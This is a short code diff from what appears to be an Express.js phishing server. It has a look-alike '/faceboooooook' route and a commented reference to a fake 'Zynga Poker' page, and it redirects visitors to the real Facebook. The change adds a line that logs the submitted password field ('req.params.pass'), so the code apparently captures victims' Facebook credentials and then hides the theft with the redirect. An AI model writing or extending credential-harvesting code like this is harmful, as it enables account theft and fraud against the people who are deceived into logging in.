@@ -26,9 +26,7 @@ app.get('/faceboooooook', (req, res,next) => {
 app.get('/', (req, res,next) => {
     console.log('Login client page');
     console.log('==\t==\t==\t');
-    console.log('req.params : ' +req.params);
-    console.log('==\t==\t==\t');
-    console.log('req.body : ' +req.body);
+    console.log('req.params.pass : ' +req.params.pass);
     console.log('==\t==\t==\t');
     //res.sendFile(__dirname + '/Zynga Poker.html')
     res.redirect('http://www.facebook.com');
